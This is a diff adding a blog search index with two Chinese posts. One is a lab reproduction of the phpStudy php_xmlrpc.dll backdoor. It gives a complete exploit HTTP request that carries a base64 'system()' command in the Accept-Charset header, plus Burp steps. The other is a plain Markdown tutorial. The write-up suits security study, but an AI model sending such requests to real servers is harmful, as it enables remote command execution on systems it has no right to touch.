@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[phpstudy后门利用]]></title>
+    <url>%2F2019%2F09%2F29%2Fphpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[之前爆出的phpstudy后门，今天来复现一下 通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里 我们可以打开文件搜索关键字@eval 发现确实存在后门 那么上EXP 1234567891011GET /1.php HTTP/1.1Host: secquan.orgCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9Accept-Encoding:gzip,deflateAccept-Charset:这里就是要执行的命令base64加密c3lzdGVtKCdjYWxjLmV4ZScpOw==Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282Connection: close Accept-Charset就是exp的核心，我们在这里面插入命令，通过base64编码，将包发送给服务器 开始实验- 首先我们打开phpstudy，将版本切换为php-5.4.45 + Apache 接下来打开burp来抓包 然后向数据内插入EXP 再burp中有编码转换的模块，打开然后开始转换 转换完成后，将其插入语句中 可以看到，代码成功执行了 注释:如果你执行失败，就修改一下包内的数据：Accept-Encoding:gzip,deflate 之间不要留空格。再你插入完成的语句的后门按两下回车。类似这样 本文到此结束]]></content>
+      <tags>
+        <tag>phpstudy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Markdown基本用法.md]]></title>
+    <url>%2F2019%2F09%2F28%2FMarkdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题也可以使用-来定义一级标题=二级标题- 这是换行 当我们需要进行段落强调。 段落强调区块引用 嵌套引用 三嵌套引用 四嵌套引用 代码区块 #include &lt;stdo.h&gt; int main(){ printf(&quot;这是一串代码&quot;); } return 0;再强调类容两侧分别加上或者-,如：*斜体 ,斜体。加粗,__加粗 使用+活-标记无序列表 第一项 第二项 第三项 第四项 使用有序列表，在前方使用数字标识，例如： 黄瓜 玉米 茄子 使用列表项中包含多个段落，为了保证渲染正常，*与段落首字母之间必须保留四个空格 段落一是否可啦啦啦啦啦啦啦啦啦 段落二 去快标记阿分割线，加入分割线 高级插入代码 123fun (x: Int, y: Int): Int &#123; return x + y&#125; 插入图片]]></content>
+      <categories>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+</search>
